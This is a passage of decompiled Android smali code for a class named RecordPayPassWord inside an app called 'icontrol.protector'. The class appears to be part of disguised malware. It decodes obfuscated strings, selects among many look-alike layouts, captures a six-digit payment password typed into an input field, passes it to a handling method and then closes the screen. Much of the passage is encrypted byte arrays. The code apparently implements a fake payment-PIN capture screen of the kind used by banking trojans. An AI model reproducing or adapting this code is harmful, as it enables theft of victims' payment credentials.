        -0x7dt
        -0x4dt
        -0x6t
        -0x18t
        -0x5bt
        -0x4at
    .end array-data

    :array_21
    .array-data 1
        -0x6t
        -0x14t
        -0x23t
        -0x63t
        -0x7at
        -0x40t
        -0x3ft
        0x1t
    .end array-data

    :array_22
    .array-data 1
        -0x77t
        -0x3et
        -0x70t
        -0x73t
        -0x5ct
        -0x8t
        0x6bt
        -0x64t
        -0x77t
    .end array-data

    nop

    :array_23
    .array-data 1
        -0x19t
        -0x53t
        -0x2t
        -0x16t
        -0x36t
        -0x63t
        0x1ct
        -0xdt
    .end array-data

    :array_24
    .array-data 1
        0x35t
        -0x72t
        0x33t
        0x43t
        -0x5ct
    .end array-data

    nop

    :array_25
    .array-data 1
        0x4ft
        -0x1at
        0x5ct
        0x2dt
        -0x3dt
        0x31t
        -0x50t
        0x46t
    .end array-data

    :array_26
    .array-data 1
        0x5at
        0x23t
        0x37t
        -0x20t
        -0x60t
        -0x21t
        -0x43t
        0x17t
    .end array-data

    :array_27
    .array-data 1
        0x20t
        0x4bt
        0x58t
        -0x72t
        -0x39t
        -0x4ft
        -0x28t
        0x60t
    .end array-data

    :array_28
    .array-data 1
        -0x59t
        -0x3ct
        0x4dt
        0x3ct
        -0x46t
        0x35t
        0x7t
        -0x31t
        -0x4et
        -0x3et
    .end array-data

    nop

    :array_29
    .array-data 1
        -0x23t
        -0x54t
        0x22t
        0x52t
        -0x23t
        0x5bt
        0x62t
        -0x48t
    .end array-data

    :array_2a
    .array-data 1
        -0x59t
        0x44t
        -0x22t
        -0x6at
    .end array-data

    :array_2b
    .array-data 1
        -0x40t
        0x2bt
        -0x50t
        -0xft
        -0x37t
        0x49t
        0x5ft
        0x10t
    .end array-data

    :array_2c
    .array-data 1
        0x74t
        -0x7bt
        -0x44t
        -0x1ft
        0x79t
        0x5bt
        0x42t
    .end array-data

    :array_2d
    .array-data 1
        0x13t
        -0x16t
        -0x2et
        -0x7at
        0x17t
        0x3et
        0x35t
        0x7t
    .end array-data

    :array_2e
    .array-data 1
        -0x6dt
        -0x3dt
        -0x66t
        -0x57t
        -0x71t
        0x31t
        -0x15t
        0x7dt
        -0x66t
    .end array-data

    nop

    :array_2f
    .array-data 1
        -0xct
        -0x54t
        -0xct
        -0x32t
        -0x1ft
        0x54t
        -0x64t
        0x12t
    .end array-data

    :array_30
    .array-data 1
        -0x2dt
        0x43t
        0x77t
        -0x3dt
    .end array-data

    :array_31
    .array-data 1
        -0x57t
        0x2bt
        0x16t
        -0x54t
        -0x4bt
        0x22t
        0x66t
        -0x55t
    .end array-data

    :array_32
    .array-data 1
        -0x33t
        0x22t
        -0x3bt
        0x6bt
        0x15t
        -0x9t
        0x47t
    .end array-data

    :array_33
    .array-data 1
        -0x49t
        0x4at
        -0x5ct
        0x4t
        0x7bt
        -0x6et
        0x30t
        -0x75t
    .end array-data

    :array_34
    .array-data 1
        -0x1bt
        -0xbt
        0x10t
        0x77t
        -0x52t
        -0x30t
        -0x80t
        0x75t
        -0xft
    .end array-data

    nop

    :array_35
    .array-data 1
        -0x61t
        -0x63t
        0x71t
        0x18t
        -0x40t
        -0x4bt
        -0x9t
        0x1at
    .end array-data

    :array_36
    .array-data 1
        0x59t
        -0x2ft
        0x47t
        -0x2t
    .end array-data

    :array_37
    .array-data 1
        0x3et
        -0x5ft
        0x26t
        -0x79t
        0x53t
        0x17t
        0xft
        -0x25t
    .end array-data

    :array_38
    .array-data 1
        0x1at
        0x15t
        0x51t
        -0x7bt
        -0x4dt
        -0x59t
        0x64t
    .end array-data

    :array_39
    .array-data 1
        0x7dt
        0x65t
        0x30t
        -0x4t
        -0x23t
        -0x3et
        0x13t
        0x4et
    .end array-data

    :array_3a
    .array-data 1
        -0x21t
        0x25t
        0x7et
        -0x3t
        -0x20t
        0x24t
        -0x21t
        0x56t
        -0x2at
    .end array-data

    nop

    :array_3b
    .array-data 1
        -0x48t
        0x55t
        0x1ft
        -0x7ct
        -0x72t
        0x41t
        -0x58t
        0x39t
    .end array-data

    :array_3c
    .array-data 1
        0x66t
        -0x6bt
        -0x9t
        0x61t
        0x3t
        0x5t
        -0x53t
    .end array-data

    :array_3d
    .array-data 1
        0x16t
        -0x3t
        -0x68t
        0xft
        0x66t
        0x75t
        -0x38t
        0x11t
    .end array-data

    :array_3e
    .array-data 1
        0x2bt
        0x41t
        -0x12t
        -0x7ct
        0x64t
        0x2at
        -0x35t
        0x4t
        0x3et
        0x5et
    .end array-data

    nop

    :array_3f
    .array-data 1
        0x5bt
        0x29t
        -0x7ft
        -0x16t
        0x1t
        0x5at
        -0x52t
        0x6at
    .end array-data

    :array_40
    .array-data 1
        -0x59t
        0x44t
        0x6at
        -0x21t
        0x1et
        -0x5dt
        0x38t
        -0x33t
        -0x4et
        0x5bt
        0x6at
        -0x21t
    .end array-data

    :array_41
    .array-data 1
        -0x29t
        0x2ct
        0x5t
        -0x4ft
        0x7bt
        -0x2dt
        0x5dt
        -0x5dt
    .end array-data

    :array_42
    .array-data 1
        -0x3bt
        0x32t
        0x7t
    .end array-data

    :array_43
    .array-data 1
        -0x5ct
        0x5ct
        0x66t
        -0x15t
        0x73t
        -0x1et
        -0x3t
        0x56t
    .end array-data

    :array_44
    .array-data 1
        -0x28t
        -0x7ft
        0x6ft
        0x72t
        0x1dt
        -0x38t
    .end array-data

    nop

    :array_45
    .array-data 1
        -0x47t
        -0x11t
        0xet
        0x1ct
        0x78t
        -0x41t
        0x78t
        -0x1ct
    .end array-data

    :array_46
    .array-data 1
        0x25t
        -0x17t
        -0x2ct
        -0x6t
        -0x3bt
        -0x7at
        -0x51t
        -0xbt
    .end array-data

    :array_47
    .array-data 1
        0x44t
        -0x79t
        -0x4bt
        -0x6ct
        -0x60t
        -0xft
        -0x40t
        -0x65t
    .end array-data

    :array_48
    .array-data 1
        0x57t
        0x22t
    .end array-data

    nop

    :array_49
    .array-data 1
        0x3at
        0x40t
        -0x7dt
        0x4ct
        0x2et
        -0x3t
        0x18t
        -0x65t
    .end array-data

    :array_4a
    .array-data 1
        -0x51t
        -0x35t
        0x64t
        -0x35t
        0x5dt
    .end array-data

    nop

    :array_4b
    .array-data 1
        -0x3et
        -0x57t
        0xat
        -0x52t
        0x2at
        0x69t
        -0x23t
        -0x29t
    .end array-data

    :array_4c
    .array-data 1
        0x5at
        -0x65t
        0x2ft
        0x7at
        0x16t
        -0x4at
        0x22t
    .end array-data

    :array_4d
    .array-data 1
        0x37t
        -0x7t
        0x41t
        0x1ft
        0x61t
        -0x27t
        0x4ct
        0x74t
    .end array-data

    :array_4e
    .array-data 1
        -0x17t
        0x25t
    .end array-data

    nop

    :array_4f
    .array-data 1
        -0x75t
        0x46t
        -0x15t
        -0x73t
        0x37t
        0x41t
        0x4ct
        -0x54t
    .end array-data

    :array_50
    .array-data 1
        0x1t
        0x46t
        -0x3dt
        0x7at
        0x3at
    .end array-data

    nop

    :array_51
    .array-data 1
        0x63t
        0x25t
        -0x53t
        0x1ft
        0x4dt
        -0x5ft
        -0x70t
        -0x7ct
    .end array-data

    :array_52
    .array-data 1
        -0x4dt
        -0x2et
        -0x4ft
        -0x11t
        0x2t
        0x23t
        -0x1ft
    .end array-data

    :array_53
    .array-data 1
        -0x2ft
        -0x4ft
        -0x21t
        -0x76t
        0x75t
        0x4ct
        -0x71t
        -0x5at
    .end array-data
.end method

.method private T(I)V
    .locals 4

    .line 1
    iget-object v0, p0, Lcom/icontrol/protector/RecordPayPassWord;->y:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    :goto_0
    const/4 v2, 0x6

    if-ge v1, v2, :cond_1

    iget-object v2, p0, Lcom/icontrol/protector/RecordPayPassWord;->z:[Landroid/widget/TextView;

    if-ge v1, p1, :cond_0

    aget-object v2, v2, v1

    sget v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a30;->a:I

    :goto_1
    invoke-virtual {v2, v3}, Landroid/view/View;->setBackgroundResource(I)V

    goto :goto_2

    :cond_0
    aget-object v2, v2, v1

    sget v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a30;->c:I

    goto :goto_1

    :goto_2
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    if-ne p1, v2, :cond_2

    invoke-direct {p0, v0}, Lcom/icontrol/protector/RecordPayPassWord;->S(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_2
    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 10

    invoke-super {p0, p1}, Landroidx/fragment/app/FragmentActivity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x6

    new-array v0, p1, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const-string v2, ""

    invoke-static {p0, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, -0x41

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    new-array v4, v1, [B

    fill-array-data v4, :array_2

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/4 v4, 0x5

    const/4 v6, 0x2

    const/4 v7, 0x3

    const/4 v8, 0x4

    if-eqz v3, :cond_0

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->a:I

    :goto_0
    invoke-virtual {p0, v0}, Landroidx/appcompat/app/AppCompatActivity;->setContentView(I)V

    goto/16 :goto_1

    :cond_0
    new-array v3, v2, [B

    const/16 v9, 0x1f

    aput-byte v9, v3, v5

    new-array v9, v1, [B

    fill-array-data v9, :array_3

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->j:I

    goto :goto_0

    :cond_1
    new-array v3, v7, [B

    fill-array-data v3, :array_4

    new-array v9, v1, [B

    fill-array-data v9, :array_5

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->l:I

    goto :goto_0

    :cond_2
    new-array v3, v8, [B

    fill-array-data v3, :array_6

    new-array v9, v1, [B

    fill-array-data v9, :array_7

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_3

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->f:I

    goto :goto_0

    :cond_3
    new-array v3, v7, [B

    fill-array-data v3, :array_8

    new-array v9, v1, [B

    fill-array-data v9, :array_9

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->k:I

    goto :goto_0

    :cond_4
    new-array v3, v8, [B

    fill-array-data v3, :array_a

    new-array v9, v1, [B

    fill-array-data v9, :array_b

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_5

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->h:I

    goto :goto_0

    :cond_5
    new-array v3, v4, [B

    fill-array-data v3, :array_c

    new-array v9, v1, [B

    fill-array-data v9, :array_d

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_6

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->n:I

    goto/16 :goto_0

    :cond_6
    new-array v3, v8, [B

    fill-array-data v3, :array_e

    new-array v9, v1, [B

    fill-array-data v9, :array_f

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_7

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->d:I

    goto/16 :goto_0

    :cond_7
    new-array v3, v8, [B

    fill-array-data v3, :array_10

    new-array v9, v1, [B

    fill-array-data v9, :array_11

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_8

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->m:I

    goto/16 :goto_0

    :cond_8
    new-array v3, v8, [B

    fill-array-data v3, :array_12

    new-array v9, v1, [B

    fill-array-data v9, :array_13

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_9

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->e:I

    goto/16 :goto_0

    :cond_9
    const/4 v3, 0x7

    new-array v3, v3, [B

    fill-array-data v3, :array_14

    new-array v9, v1, [B

    fill-array-data v9, :array_15

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->i:I

    goto/16 :goto_0

    :cond_a
    new-array v3, v7, [B

    fill-array-data v3, :array_16

    new-array v9, v1, [B

    fill-array-data v9, :array_17

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->b:I

    goto/16 :goto_0

    :cond_b
    new-array v3, v6, [B

    fill-array-data v3, :array_18

    new-array v9, v1, [B

    fill-array-data v9, :array_19

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_c

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->g:I

    goto/16 :goto_0

    :cond_c
    new-array v3, v6, [B

    fill-array-data v3, :array_1a

    new-array v1, v1, [B

    fill-array-data v1, :array_1b

    invoke-static {v3, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_d

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->c:I

    goto/16 :goto_0

    :cond_d
    :goto_1
    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->j:I

    invoke-virtual {p0, v0}, Landroidx/appcompat/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/icontrol/protector/RecordPayPassWord;->y:Landroid/widget/EditText;

    new-array p1, p1, [Landroid/widget/TextView;

    iput-object p1, p0, Lcom/icontrol/protector/RecordPayPassWord;->z:[Landroid/widget/TextView;

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->d:I

    invoke-virtual {p0, v0}, Landroidx/appcompat/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    aput-object v0, p1, v5

    iget-object p1, p0, Lcom/icontrol/protector/RecordPayPassWord;->z:[Landroid/widget/TextView;

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->e:I

    invoke-virtual {p0, v0}, Landroidx/appcompat/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    aput-object v0, p1, v2

    iget-object p1, p0, Lcom/icontrol/protector/RecordPayPassWord;->z:[Landroid/widget/TextView;

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->f:I

    invoke-virtual {p0, v0}, Landroidx/appcompat/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    aput-object v0, p1, v6

    iget-object p1, p0, Lcom/icontrol/protector/RecordPayPassWord;->z:[Landroid/widget/TextView;

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->g:I

    invoke-virtual {p0, v0}, Landroidx/appcompat/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    aput-object v0, p1, v7

    iget-object p1, p0, Lcom/icontrol/protector/RecordPayPassWord;->z:[Landroid/widget/TextView;

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->h:I

    invoke-virtual {p0, v0}, Landroidx/appcompat/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    aput-object v0, p1, v8

    iget-object p1, p0, Lcom/icontrol/protector/RecordPayPassWord;->z:[Landroid/widget/TextView;

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->i:I

    invoke-virtual {p0, v0}, Landroidx/appcompat/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    aput-object v0, p1, v4

    iget-object p1, p0, Lcom/icontrol/protector/RecordPayPassWord;->y:Landroid/widget/EditText;

    if-eqz p1, :cond_e

    new-instance v0, Lcom/icontrol/protector/RecordPayPassWord$a;

    invoke-direct {v0, p0}, Lcom/icontrol/protector/RecordPayPassWord$a;-><init>(Lcom/icontrol/protector/RecordPayPassWord;)V

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->addTextChangedListener(Landroid/text/TextWatcher;)V

    :cond_e
    iget-object p1, p0, Lcom/icontrol/protector/RecordPayPassWord;->y:Landroid/widget/EditText;

    if-eqz p1, :cond_f

    invoke-virtual {p1}, Landroid/view/View;->requestFocus()Z

    :cond_f
    return-void

    nop

    :array_0
    .array-data 1
        -0x3at
        0x3dt
        0x2ct
        -0x6ft
        0x3et
        0x7t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x4at
        0x5ct
        0x55t
        -0x1t
        0x5bt
        0x70t
        -0x50t
        -0x66t
    .end array-data

    :array_2
    .array-data 1
        -0x22t
        0x34t
        0x4ct
        -0x32t
        -0x49t
        0x10t
        -0x49t
        -0x18t
    .end array-data

    :array_3
    .array-data 1
        0x68t
        0x24t
        -0x41t
        -0x7dt
        -0x3ft
        -0x59t
        -0x33t
        -0x4at
    .end array-data

    :array_4
    .array-data 1
        -0x39t
        0x4bt
        0x8t
    .end array-data

    :array_5
    .array-data 1
        -0x42t
        0x3et
        0x66t
        0x11t
        -0x7dt
        0x58t
        -0x77t
        -0x6dt
    .end array-data

    :array_6
    .array-data 1
        0x69t
        -0x72t
        -0x22t
        -0x49t
    .end array-data

    :array_7
    .array-data 1
        0x3t
        -0x19t
        -0x41t
        -0x27t
        -0x66t
        -0x5at
        -0x34t
        0x1at
    .end array-data

    :array_8
    .array-data 1
        0x7at
        0x34t
        -0x9t
    .end array-data

    :array_9
    .array-data 1
        0x3t
        0x5bt
        -0x7et
        0x2t
        0x66t
        0x8t
        -0x3at
        -0x69t
    .end array-data

    :array_a
    .array-data 1
        -0x5et
        0x78t
        0x27t
        -0x7ct
    .end array-data

    :array_b
    .array-data 1
        -0x34t
        0x17t
        0x49t
        -0x1dt
        0x1dt
        -0x6et
        -0x48t
        -0x7dt
    .end array-data

    :array_c
    .array-data 1
        -0x29t
        -0x10t
        -0x2ft
        0x34t
        0x27t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x53t
        -0x68t
        -0x42t
        0x5at
        0x40t
        -0x42t
        -0x1ft
        0x12t
    .end array-data

    :array_e
    .array-data 1
        0x17t
        -0x2ft
        -0x46t
        -0x45t
    .end array-data

    :array_f
    .array-data 1
        0x70t
        -0x42t
        -0x2ct
        -0x24t
        0x53t
        0x46t
        0x5t
        0x3bt
    .end array-data

    :array_10
    .array-data 1
        -0x25t
        0x17t
        -0x78t
        -0x9t
    .end array-data

    :array_11
    .array-data 1
        -0x5ft
        0x7ft
        -0x17t
        -0x68t
        0x1t
        0x22t
        0x28t
        -0x1dt
    .end array-data

    :array_12
    .array-data 1
        0x29t
        -0x14t
        -0x39t
        -0x1et
    .end array-data

    :array_13
    .array-data 1
        0x4et
        -0x64t
        -0x5at
        -0x65t
        0x47t
        0x4ft
        -0x10t
        0x59t
    .end array-data

    :array_14
    .array-data 1
        -0x41t
        0x57t
        0x4ft
        -0x68t
        -0x47t
        -0x6et
        0x5ft
    .end array-data

    :array_15
    .array-data 1
        -0x31t
        0x3ft
        0x20t
        -0xat
        -0x24t
        -0x1et
        0x3at
        -0x54t
    .end array-data

    :array_16
    .array-data 1
        -0x72t
        0x5ft
        -0x15t
    .end array-data

    :array_17
    .array-data 1
        -0x11t
        0x31t
        -0x76t
        -0x50t
        0x3ct
        0x1t
        -0x5dt
        0x6et
    .end array-data

    :array_18
    .array-data 1
        0xft
        -0x44t
    .end array-data

    nop

    :array_19
    .array-data 1
        0x62t
        -0x22t
        0x1bt
        0x7et
        0x65t
        0x47t
        -0x42t
        0x2bt
    .end array-data

    :array_1a
    .array-data 1
        -0x2ft
        0x2ct
    .end array-data

    nop

    :array_1b
    .array-data 1
        -0x4dt
        0x4ft
        0x7t
        -0x5bt
        -0x18t
        0x70t
        0x57t
        -0x80t
    .end array-data
.end method

.method protected onPause()V
    .locals 1

    invoke-super {p0}, Landroidx/fragment/app/FragmentActivity;->onPause()V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/icontrol/protector/RecordPayPassWord;->A:Z

    return-void
.end method

.method protected onResume()V
    .locals 1

    invoke-super {p0}, Landroidx/fragment/app/FragmentActivity;->onResume()V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/icontrol/protector/RecordPayPassWord;->A:Z

    return-void
.end method

.method public onWindowFocusChanged(Z)V
    .locals 3

    invoke-super {p0, p1}, Landroid/app/Activity;->onWindowFocusChanged(Z)V

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/icontrol/protector/RecordPayPassWord;->y:Landroid/widget/EditText;

    if-eqz p1, :cond_0

    new-instance v0, Lcom/icontrol/protector/RecordPayPassWord$b;

    invoke-direct {v0, p0}, Lcom/icontrol/protector/RecordPayPassWord$b;-><init>(Lcom/icontrol/protector/RecordPayPassWord;)V

    const-wide/16 v1, 0xc8

